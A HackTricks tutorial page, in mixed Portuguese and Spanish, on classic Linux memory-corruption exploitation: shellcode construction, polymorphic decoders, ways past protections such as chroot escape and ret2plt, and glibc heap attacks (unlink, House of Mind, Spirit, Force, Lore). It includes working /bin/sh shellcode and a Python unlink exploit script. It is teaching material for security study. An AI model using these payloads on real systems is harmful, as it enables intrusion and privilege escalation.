# Linux Exploiting (Basic) (SPA)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **2.SHELLCODE**

Ver interrup√ß√µes de kernel: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; limpamos eax\
xor ebx, ebx ; ebx = 0 pois n√£o h√° argumento que passar\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Executar syscall

**nasm -f elf assembly.asm** ‚Äî> Nos retorna um .o\
**ld assembly.o -o shellcodeout** ‚Äî> Nos d√° um execut√°vel formado pelo c√≥digo assembly e podemos obter os opcodes com **objdump**\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Para ver que efetivamente √© nossa shellcode e obter os OpCodes

**Verificar se a shellcode funciona**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Para ver que as chamadas de sistema s√£o realizadas corretamente, deve-se compilar o programa anterior e as chamadas de sistema devem aparecer em **strace ./PROGRAMA\_COMPILADO**

Na hora de criar shellcodes, pode-se realizar um truque. A primeira instru√ß√£o √© um jump para um call. O call chama o c√≥digo original e ainda coloca no stack o EIP. Depois da instru√ß√£o call, colocamos a string que precisarmos, ent√£o com esse EIP podemos apontar para a string e al√©m disso continuar executando o c√≥digo.

EJ **TRUQUE (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**EJ usando a Stack(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Egg Huter:**

Consiste em um pequeno c√≥digo que percorre as p√°ginas de mem√≥ria associadas a um processo em busca da shellcode ali guardada (busca alguma assinatura colocada na shellcode). √ötil nos casos em que se tem apenas um pequeno espa√ßo para injetar c√≥digo.

**Shellcodes polim√≥rficos**

Consistem em shells criptografadas que t√™m um pequeno c√≥digo que as descriptografa e salta para ele, usando o truque de Call-Pop este seria um **exemplo cifrado cesar**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
## **5.M√©todos complementarios**

**T√©cnica de Murat**

Em linux, todos os programas s√£o mapeados come√ßando em 0xbfffffff

Vendo como se constr√≥i a pilha de um novo processo em linux, pode-se desenvolver um exploit de forma que o programa seja iniciado em um ambiente cuja √∫nica vari√°vel seja a shellcode. A endere√ßo desta ent√£o pode ser calculada como: addr = 0xbfffffff - 4 - strlen(NOME\_ejecutable\_completo) - strlen(shellcode)

Dessa forma, obter-se-ia de forma simples a endere√ßo onde est√° a vari√°vel de ambiente com a shellcode.

Isso pode ser feito gra√ßas √† fun√ß√£o execle que permite criar um ambiente que s√≥ tenha as vari√°veis de ambiente desejadas.

##

###

###

###

###

### **Format Strings to Buffer Overflows**

A **sprintf moves** uma string formatada **para** uma **vari√°vel.** Portanto, voc√™ poderia abusar do **formato** de uma string para causar um **buffer overflow na vari√°vel** onde o conte√∫do √© copiado.\
Por exemplo, o payload `%.44xAAAA` ir√° **escrever 44B+"AAAA" na vari√°vel**, o que pode causar um buffer overflow.

### **\_\_atexit Structures**

{% hint style="danger" %}
Hoje em dia √© muito **estranho explorar isso**.
{% endhint %}

**`atexit()`** √© uma fun√ß√£o √† qual **outras fun√ß√µes s√£o passadas como par√¢metros.** Essas **fun√ß√µes** ser√£o **executadas** ao executar um **`exit()`** ou o **retorno** do **main**.\
Se voc√™ puder **modificar** o **endere√ßo** de qualquer uma dessas **fun√ß√µes** para apontar para uma shellcode, por exemplo, voc√™ **ganhar√° controle** do **processo**, mas isso atualmente √© mais complicado.\
Atualmente, os **endere√ßos das fun√ß√µes** a serem executadas est√£o **ocultos** atr√°s de v√°rias estruturas e, finalmente, o endere√ßo para o qual apontam n√£o s√£o os endere√ßos das fun√ß√µes, mas est√£o **criptografados com XOR** e deslocamentos com uma **chave aleat√≥ria**. Portanto, atualmente, esse vetor de ataque **n√£o √© muito √∫til, pelo menos em x86** e **x64\_86**.\
A **fun√ß√£o de criptografia** √© **`PTR_MANGLE`**. **Outras arquiteturas** como m68k, mips32, mips64, aarch64, arm, hppa... **n√£o implementam a fun√ß√£o de criptografia** porque ela **retorna o mesmo** que recebeu como entrada. Portanto, essas arquiteturas seriam atac√°veis por esse vetor.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Hoje em dia √© muito **estranho explorar isso**.
{% endhint %}

**`Setjmp()`** permite **salvar** o **contexto** (os registradores)\
**`longjmp()`** permite **restaurar** o **contexto**.\
Os **registradores salvos** s√£o: `EBX, ESI, EDI, ESP, EIP, EBP`\
O que acontece √© que EIP e ESP s√£o passados pela **`PTR_MANGLE`** fun√ß√£o, ent√£o a **arquitetura vulner√°vel a esse ataque √© a mesma que acima**.\
Eles s√£o √∫teis para recupera√ß√£o de erros ou interrup√ß√µes.\
No entanto, pelo que li, os outros registradores n√£o est√£o protegidos, **ent√£o se houver um `call ebx`, `call esi` ou `call edi`** dentro da fun√ß√£o chamada, o controle pode ser assumido. Ou voc√™ tamb√©m poderia modificar EBP para modificar o ESP.

**VTable e VPTR em C++**

Cada classe tem uma **Vtable** que √© um array de **ponteiros para m√©todos**.

Cada objeto de uma **classe** tem um **VPtr** que √© um **ponteiro** para o array de sua classe. O VPtr √© parte do cabe√ßalho de cada objeto, ent√£o se uma **sobrescrita** do **VPtr** for alcan√ßada, ele poderia ser **modificado** para **apontar** para um m√©todo fict√≠cio, de forma que a execu√ß√£o de uma fun√ß√£o v√° para a shellcode.

## **Medidas preventivas e evas√µes**

###

**Reemplazo de Libsafe**

√â ativado com: LD\_PRELOAD=/lib/libsafe.so.2\
ou\
‚Äú/lib/libsave.so.2‚Äù > /etc/ld.so.preload

Intercepta as chamadas a algumas fun√ß√µes inseguras por outras seguras. N√£o est√° padronizado. (apenas para x86, n√£o para compila√ß√µes com -fomit-frame-pointer, n√£o compila√ß√µes est√°ticas, nem todas as fun√ß√µes vulner√°veis se tornam seguras e LD\_PRELOAD n√£o funciona em bin√°rios com suid).

**ASCII Armored Address Space**

Consiste em carregar as bibliotecas compartilhadas de 0x00000000 a 0x00ffffff para que sempre haja um byte 0x00. No entanto, isso realmente n√£o impede quase nenhum ataque, e menos em little endian.

**ret2plt**

Consiste em realizar um ROP de forma que se chame a fun√ß√£o strcpy@plt (da plt) e se aponte para a entrada da GOT e se copie o primeiro byte da fun√ß√£o que se deseja chamar (system()). Em seguida, faz-se o mesmo apontando para GOT+1 e se copia o 2¬∫ byte de system()‚Ä¶ No final, chama-se o endere√ßo guardado na GOT que ser√° system().

**Jaulas com chroot()**

debootstrap -arch=i386 hardy /home/user ‚Äî> Instala um sistema b√°sico sob um subdiret√≥rio espec√≠fico

Um admin pode sair de uma dessas jaulas fazendo: mkdir foo; chroot foo; cd ..

**Instrumenta√ß√£o de c√≥digo**

Valgrind ‚Äî> Busca erros\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Heap Overflows: Exploits b√°sicos**

**Trozo asignado**

prev\_size |\
size | ‚ÄîCabe√ßalho\
\*mem | Dados

**Trozo livre**

prev\_size |\
size |\
\*fd | Ptr forward chunk\
\*bk | Ptr back chunk ‚ÄîCabe√ßalho\
\*mem | Dados

Os trozos livres est√£o em uma lista duplamente encadeada (bin) e nunca podem haver dois trozos livres juntos (eles se juntam).

Em ‚Äúsize‚Äù h√° bits para indicar: Se o trozo anterior est√° em uso, se o trozo foi alocado por mmap() e se o trozo pertence √† arena prim√°ria.

Se ao liberar um trozo algum dos cont√≠guos estiver livre, eles se fundem atrav√©s da macro unlink() e o novo trozo maior √© passado para frontlink() para que insira o bin adequado.

unlink(){\
BK = P->bk; ‚Äî> O BK do novo chunk √© o que tinha o que j√° estava livre antes\
FD = P->fd; ‚Äî> O FD do novo chunk √© o que tinha o que j√° estava livre antes\
FD->bk = BK; ‚Äî> O BK do pr√≥ximo chunk aponta para o novo chunk\
BK->fd = FD; ‚Äî> O FD do chunk anterior aponta para o novo chunk\
}

Portanto, se conseguirmos modificar o P->bk com o endere√ßo de uma shellcode e o P->fd com o endere√ßo a uma entrada na GOT ou DTORS menos 12, consegue-se:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

E assim se executa ao sair do programa a shellcode.

Al√©m disso, a 4¬™ senten√ßa de unlink() escreve algo e a shellcode tem que estar reparada para isso:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) ‚Äî> Isso provoca a escrita de 4 bytes a partir do 8¬∫ byte da shellcode, por isso a primeira instru√ß√£o da shellcode deve ser um jmp para pular isso e cair em uns nops que levem ao resto da shellcode.

Portanto, o exploit √© criado:

No buffer1 colocamos a shellcode come√ßando por um jmp para que caia nos nops ou no resto da shellcode.

Depois da shellcode colocamos preenchimento at√© chegar ao campo prev\_size e size do pr√≥ximo trozo. Nesses locais colocamos 0xfffffff0 (de forma que se sobrescreva o prev\_size para que tenha o bit que diz que est√° livre) e ‚Äú-4‚Äú(0xfffffffc) no size (para que quando verificar no 3¬∫ trozo se o 2¬∫ estava livre, na verdade v√° ao prev\_size modificado que dir√° que est√° livre) -> Assim, quando free() investigar, ir√° ao size do 3¬∫, mas na verdade ir√° ao 2¬∫ - 4 e pensar√° que o 2¬∫ trozo est√° livre. E ent√£o chamar√° **unlink()**.

Ao chamar unlink() usar√° como P->fd os primeiros dados do 2¬∫ trozo, portanto, ali se colocar√° o endere√ßo que se deseja sobrescrever - 12 (pois em FD->bk ele somar√° 12 ao endere√ßo guardado em FD). E nesse endere√ßo introduzir√° o segundo endere√ßo que encontrar no 2¬∫ trozo, que nos interessar√° que seja o endere√ßo da shellcode (P->bk falso).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #Interesa que o bit que indica que o anterior trozo est√° livre esteja a 1**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, para que pense que o ‚Äúsize‚Äù do 3¬∫ trozo est√° 4bytes atr√°s (aponta para prev\_size) pois √© a√≠ que olha se o 2¬∫ trozo est√° livre**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #No payload no in√≠cio vamos colocar 8bytes de preenchimento**

**got\_free = pack("\<I", 0x08048300 - 12) #Endere√ßo de free() na plt-12 (ser√° o endere√ßo que se sobrescrever√° para que se lance a shellcode na 2¬™ vez que se chamar free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Como se disse, o payload come√ßa com 8 bytes de preenchimento porque sim**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Se modifica o 2¬∫ trozo, o got\_free aponta para onde vamos guardar a dire√ß√£o addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() liberando em sentido inverso (wargame)**

Estamos controlando 3 chunks consecutivos e eles s√£o liberados em ordem inversa √† reservada.

Nesse caso:

No chunk c coloca-se a shellcode

O chunk a usamos para sobrescrever o b de forma que o size tenha o bit PREV\_INUSE desativado, de forma que pense que o chunk a est√° livre.

Al√©m disso, sobrescrevemos no cabe√ßalho b o size para que valha -4.

Ent√£o, o programa pensar√° que ‚Äúa‚Äù est√° livre e em um bin, portanto chamar√° unlink() para desenla√ß√°-lo. No entanto, como o cabe√ßalho PREV\_SIZE vale -4, pensar√° que o trozo de ‚Äúa‚Äù realmente come√ßa em b+4. Ou seja, far√° um unlink() a um trozo que come√ßa em b+4, portanto em b+12 estar√° o ponteiro ‚Äúfd‚Äù e em b+16 estar√° o ponteiro ‚Äúbk‚Äù.

Dessa forma, se em bk colocarmos o endere√ßo da shellcode e em fd colocarmos o endere√ßo da fun√ß√£o ‚Äúputs()‚Äù-12, temos nosso payload.

**T√©cnica de Frontlink**

Chama-se frontlink quando se libera algo e nenhum de seus trozos cont√≠guos est√° livre, n√£o se chama unlink() mas sim diretamente frontlink().

Vulnerabilidade √∫til quando o malloc que se ataca nunca √© liberado (free()).

Necessita:

Um buffer que possa ser desbordado com a fun√ß√£o de entrada de dados

Um buffer cont√≠guo a este que deve ser liberado e ao qual se modificar√° o campo fd de seu cabe√ßalho gra√ßas ao desbordamento do buffer anterior

Um buffer a liberar com um tamanho maior que 512, mas menor que o buffer anterior

Um buffer declarado antes do passo 3 que permita sobrescrever o prev\_size deste

Dessa forma, conseguindo sobrescrever em dois mallocs de forma descontrolada e em um de forma controlada, mas que s√≥ se libera esse um, podemos fazer um exploit.

**Vulnerabilidade double free()**

Se se chama duas vezes a free() com o mesmo ponteiro, ficam dois bins apontando para o mesmo endere√ßo.

No caso de querer voltar a usar um, ele seria atribu√≠do sem problemas. No caso de querer usar outro, seria atribu√≠do o mesmo espa√ßo, portanto ter√≠amos os ponteiros ‚Äúfd‚Äù e ‚Äúbk‚Äù falsificados com os dados que escrever√° a reserva anterior.

**After free()**

Um ponteiro previamente liberado √© usado novamente sem controle.

## **8 Heap Overflows: Exploits avan√ßados**

As t√©cnicas de Unlink() e FrontLink() foram eliminadas ao modificar a fun√ß√£o unlink().

**The house of mind**

Apenas uma chamada a free() √© necess√°ria para provocar a execu√ß√£o de c√≥digo arbitr√°rio. √â interessante buscar um segundo trozo que pode ser desbordado por um anterior e liberado.

Uma chamada a free() provoca chamar public\_fREe(mem), este faz:

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mes); ‚Äî> Retorna um ponteiro ao endere√ßo onde come√ßa o trozo (mem-8)

‚Ä¶

ar\_ptr = arena\_for\_chunk(p); ‚Äî> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

‚Ä¶

\_int\_free(ar\_ptr, mem);

}

Em \[1] verifica o campo size o bit NON\_MAIN\_ARENA, o qual pode ser alterado para que a verifica√ß√£o retorne true e execute heap\_for\_ptr() que faz um and a ‚Äúmem‚Äù deixando a 0 os 2.5 bytes menos importantes (no nosso caso de 0x0804a000 deixa 0x08000000) e acessa 0x08000000->ar\_ptr (como se fosse um struct heap\_info)

Dessa forma, se podemos controlar um trozo, por exemplo em 0x0804a000 e vai ser liberado um trozo em **0x081002a0**, podemos chegar ao endere√ßo 0x08100000 e escrever o que quisermos, por exemplo **0x0804a000**. Quando esse segundo trozo for liberado, encontrar√° que heap\_for\_ptr(ptr)->ar\_ptr retorna o que escrevemos em 0x08100000 (pois se aplica a 0x081002a0 o and que vimos antes e da√≠ se saca o valor dos 4 primeiros bytes, o ar\_ptr)

Dessa forma, chama-se \_int\_free(ar\_ptr, mem), ou seja, **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
‚Ä¶\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Como vimos antes, podemos controlar o valor de av, pois √© o que escrevemos no trozo que vai ser liberado.

Tal como se define unsorted\_chunks, sabemos que:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Portanto, se em av->bins\[2] escrevemos o valor de \_\_DTOR\_END\_\_-12, na √∫ltima instru√ß√£o se escrever√° em \_\_DTOR\_END\_\_ o endere√ßo do segundo trozo.

Ou seja, no primeiro trozo temos que colocar no in√≠cio muitas vezes o endere√ßo de \_\_DTOR\_END\_\_-12 porque √© da√≠ que av->bins\[2] o tirar√°.

No endere√ßo que cair o endere√ßo do segundo trozo com os √∫ltimos 5 zeros, deve-se escrever o endere√ßo a este primeiro trozo para que heap\_for\_ptr() pense que o ar\_ptr est√° ao in√≠cio do primeiro trozo e saque da√≠ o av->bins\[2].

No segundo trozo e gra√ßas ao primeiro, sobrescrevemos o prev\_size com um jump 0x0c e o size com algo para ativar -> NON\_MAIN\_ARENA.

A seguir, no trozo 2 colocamos um monte de nops e finalmente a shellcode.

Dessa forma, chamar√° \_int\_free(TROZO1, TROZO2) e seguir√° as instru√ß√µes para escrever em \_\_DTOR\_END\_\_ o endere√ßo do prev\_size do TROZO2, o qual saltar√° para a shellcode.

Para aplicar essa t√©cnica, √© necess√°rio que se cumpram alguns requisitos mais que complicam um pouco mais o payload.

Essa t√©cnica j√° n√£o √© aplic√°vel, pois foi aplicado quase o mesmo patch que para unlink. Compara-se se o novo local para o qual se aponta tamb√©m est√° apontando para ele.

**Fastbin**

√â uma variante de The house of mind.

Nos interessa chegar a executar o seguinte c√≥digo ao qual se chega passada a primeira verifica√ß√£o da fun√ß√£o \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] ‚Äî> Sendo fastbin\_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = \*fb

\*fb = p

Dessa forma, se se colocar em ‚Äúfb‚Äù d√° endere√ßo de uma fun√ß√£o na GOT, nesse endere√ßo se colocar√° o endere√ßo ao trozo sobrescrito. Para isso ser√° necess√°rio que a arena esteja perto dos endere√ßos de dtors. Mais exatamente, que av->max\_fast esteja no endere√ßo que vamos sobrescrever.

Dado que com The House of Mind vimos que n√≥s control√°vamos a posi√ß√£o do av.

Ent√£o, se no campo size colocarmos um tamanho de 8 + NON\_MAIN\_ARENA + PREV\_INUSE ‚Äî> fastbin\_index() nos devolver√° fastbins\[-1], que apontar√° para av->max\_fast.

Nesse caso, av->max\_fast ser√° o endere√ßo que se sobrescrever√° (n√£o a que aponte, mas essa posi√ß√£o ser√° a que se sobrescrever√°).

Al√©m disso, deve-se cumprir que o trozo cont√≠guo ao liberado deve ser maior que 8 -> Dado que dissemos que o size do trozo liberado √© 8, nesse trozo falso s√≥ temos que colocar um size maior que 8 (como al√©m disso a shellcode ir√° no trozo liberado, haver√° que colocar no in√≠cio um jmp que caia em nops).

Al√©m disso, esse mesmo trozo falso deve ser menor que av->system\_mem. av->system\_mem est√° 1848 bytes mais al√©m.

Por culpa dos nulos de \_DTOR\_END\_ e das poucas dire√ß√µes na GOT, nenhum endere√ßo dessas se√ß√µes serve para ser sobrescrito, assim que vejamos como aplicar fastbin para atacar a pilha.

Outra forma de ataque √© redirecionar o **av** para a pilha.

Se modificarmos o size para que d√™ 16 em vez de 8, ent√£o: fastbin\_index() nos devolver√° fastbins\[0] e podemos fazer uso disso para sobrescrever a pilha.

Para isso, n√£o deve haver nenhum canary nem valores estranhos na pilha, de fato, temos que nos encontrar nela: 4bytes nulos + EBP + RET.

Os 4 bytes nulos s√£o necess√°rios para que o **av** esteja a esse endere√ßo e o primeiro elemento de um **av** √© o mutex que deve valer 0.

O **av->max\_fast** ser√° o EBP e ser√° um valor que nos servir√° para saltar as restri√ß√µes.

No **av->fastbins\[0]** se sobrescrever√° com o endere√ßo de **p** e ser√° o RET, assim se saltar√° para a shellcode.

Al√©m disso, em **av->system\_mem** (1484bytes acima da posi√ß√£o na pilha) haver√° bastante lixo que nos permitir√° saltar a verifica√ß√£o que se realiza.

Al√©m disso, deve-se cumprir que o trozo cont√≠guo ao liberado deve ser maior que 8 -> Dado que dissemos que o size do trozo liberado √© 16, nesse trozo falso s√≥ temos que colocar um size maior que 8 (como al√©m disso a shellcode ir√° no trozo liberado, haver√° que colocar no in√≠cio um jmp que caia em nops que v√£o depois do campo size do novo trozo falso).

**The House of Spirit**

Nesse caso, buscamos ter um ponteiro a um malloc que possa ser alter√°vel pelo atacante (por exemplo, que o ponteiro esteja na pilha abaixo de um poss√≠vel overflow a uma vari√°vel).

Assim, poder√≠amos fazer com que esse ponteiro apontasse para onde fosse. No entanto, nem todo local √© v√°lido, o tamanho do trozo falsificado deve ser menor que av->max\_fast e mais especificamente igual ao tamanho solicitado em uma futura chamada a malloc()+8. Por isso, se sabemos que depois desse ponteiro vulner√°vel se chama malloc(40), o tamanho do trozo falso deve ser igual a 48.

Se por exemplo o programa perguntasse ao usu√°rio por um n√∫mero, poder√≠amos introduzir 48 e apontar o ponteiro de malloc modific√°vel para os seguintes 4bytes (que poderiam pertencer ao EBP com sorte, assim o 48 fica por tr√°s, como se fosse a cabe√ßalho size). Al√©m disso, o endere√ßo ptr-4+48 deve cumprir v√°rias condi√ß√µes (sendo nesse caso ptr=EBP), ou seja, 8 < ptr-4+48 < av->system\_mem.

Caso isso se cumpra, quando se chamar o pr√≥ximo malloc que dissemos que era malloc(40), ser√° atribu√≠do como endere√ßo o endere√ßo do EBP. Caso o atacante tamb√©m possa controlar o que se escreve nesse malloc, pode sobrescrever tanto o EBP quanto o EIP com o endere√ßo que quiser.

Isso creio que √© porque assim quando o liberar free() guardar√° que no endere√ßo que aponta ao EBP da pilha h√° um trozo de tamanho perfeito para o novo malloc() que se quer reservar, assim que lhe atribui esse endere√ßo.

**The House of Force**

√â necess√°rio:

* Um overflow a um trozo que permita sobrescrever o wilderness
* Uma chamada a malloc() com o tamanho definido pelo usu√°rio
* Uma chamada a malloc() cujos dados possam ser definidos pelo usu√°rio

O primeiro que se faz √© sobrescrever o size do trozo wilderness com um valor muito grande (0xffffffff), assim qualquer solicita√ß√£o de mem√≥ria suficientemente grande ser√° tratada em \_int\_malloc() sem necessidade de expandir o heap.

O segundo √© alterar o av->top para que aponte a uma zona de mem√≥ria sob o controle do atacante, como a pilha. Em av->top se colocar√° \&EIP - 8.

Temos que sobrescrever av->top para que aponte √† zona de mem√≥ria sob o controle do atacante:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim coleta o valor do endere√ßo do trozo wilderness atual (o atual av->top) e remainder √© exatamente a soma desse endere√ßo mais a quantidade de bytes solicitados por malloc(). Portanto, se \&EIP-8 est√° em 0xbffff224 e av->top cont√©m 0x080c2788, ent√£o a quantidade que temos que reservar no malloc controlado para que av->top fique apontando para $EIP-8 para o pr√≥ximo malloc() ser√°:

0xbffff224 - 0x080c2788 = 3086207644.

Assim, se guardar√° em av->top o valor alterado e o pr√≥ximo malloc apontar√° ao EIP e poder√° sobrescrev√™-lo.

√â importante saber que o size do novo trozo wilderness seja maior que a solicita√ß√£o realizada pelo √∫ltimo malloc(). Ou seja, se o wilderness est√° apontando para \&EIP-8, o size ficar√° justo no campo EBP da pilha.

**The House of Lore**

**Corrup√ß√£o SmallBin**

Os trozos liberados s√£o introduzidos no bin em fun√ß√£o de seu tamanho. Mas antes de serem introduzidos, s√£o guardados em unsorted bins. Um trozo √© liberado, n√£o se coloca imediatamente em seu bin, mas fica em unsorted bins. A seguir, se se reserva um novo trozo e o anterior liberado pode servir, se o devolve, mas se se reserva maior, o trozo liberado em unsorted bins se coloca em seu bin adequado.

Para alcan√ßar o c√≥digo vulner√°vel, a solicita√ß√£o de mem√≥ria dever√° ser maior que av->max\_fast (72 normalmente) e menor que MIN\_LARGE\_SIZE (512).

Se no bin h√° um trozo do tamanho adequado ao que se pede, se devolve esse depois de desenla√ß√°-lo:

bck = victim->bk; Aponta ao trozo anterior, √© a √∫nica info que podemos alterar.

bin->bk = bck; O pen√∫ltimo trozo passa a ser o √∫ltimo, caso bck aponte para a pilha, ao pr√≥ximo trozo reservado se lhe dar√° esse endere√ßo.

bck->fd = bin; Se fecha a lista fazendo com que este aponte para bin.

√â necess√°rio:

Que se reservem dois malloc, de forma que ao primeiro se lhe possa fazer overflow depois que o segundo tenha sido liberado e introduzido em seu bin (ou seja, se tenha reservado um malloc superior ao segundo trozo antes de fazer o overflow).

Que o malloc reservado ao qual se lhe d√° o endere√ßo escolhido pelo atacante seja controlado pelo atacante.

O objetivo √© o seguinte, se podemos fazer um overflow a um heap que tem por baixo um trozo j√° liberado e em seu bin, podemos alterar seu ponteiro bk. Se alteramos seu ponteiro bk e esse trozo chega a ser o primeiro da lista de bin e se reserva, a bin se enganar√° e se dir√° que o √∫ltimo trozo da lista (o pr√≥ximo a oferecer) est√° no endere√ßo falso que colocamos (na pilha ou GOT, por exemplo). Portanto, se se voltar a reservar outro trozo e o atacante tem permiss√µes nele, se lhe dar√° um trozo na posi√ß√£o desejada e poder√° escrever nele.

Ap√≥s liberar o trozo modificado, √© necess√°rio que se reserve um trozo maior que o liberado, assim o trozo modificado sair√° de unsorted bins e se introduziria em seu bin.

Uma vez em seu bin, √© o momento de modificar seu ponteiro bk atrav√©s do overflow para que aponte para o endere√ßo que queremos sobrescrever.

Assim, o bin dever√° esperar turno at√© que se chame a malloc() suficientes vezes para que se volte a utilizar o bin modificado e enganar o bin fazendo-o acreditar que o pr√≥ximo trozo est√° no endere√ßo falso. E a seguir se dar√° o trozo que nos interessa.

Para que se execute a vulnerabilidade o mais r√°pido poss√≠vel, o ideal seria: Reserva do trozo vulner√°vel, reserva do trozo que se modificar√°, se libera esse trozo, se reserva um trozo maior ao que se modificar√°, se modifica o trozo (vulnerabilidade), se reserva um trozo de igual tamanho ao vulnerado e se reserva um segundo trozo de igual tamanho e este ser√° o que aponte para o endere√ßo escolhido.

Para proteger esse ataque, usou-se a t√≠pica verifica√ß√£o de que o trozo ‚Äún√£o‚Äù √© falso: verifica-se se bck->fd est√° apontando para victim. Ou seja, no nosso caso, se o ponteiro fd\* do trozo falso apontado na pilha est√° apontando para victim. Para ultrapassar essa prote√ß√£o, o atacante deveria ser capaz de escrever de alguma forma (provavelmente pela pilha) no endere√ßo adequado a dire√ß√£o de victim. Para que assim pare√ßa um trozo verdadeiro.

**Corrup√ß√£o LargeBin**

S√£o necess√°rios os mesmos requisitos que antes e mais alguns, al√©m disso, os trozos reservados devem ser maiores que 512.

O ataque √© como o anterior, ou seja, tem que modificar o ponteiro bk e se precisam todas essas chamadas a malloc(), mas al√©m disso, h√° que modificar o size do trozo modificado de forma que esse size - nb seja < MINSIZE.

Por exemplo, far√° que colocar em size 1552 para que 1552 - 1544 = 8 < MINSIZE (a subtra√ß√£o n√£o pode ficar negativa porque se compara um unsigned).

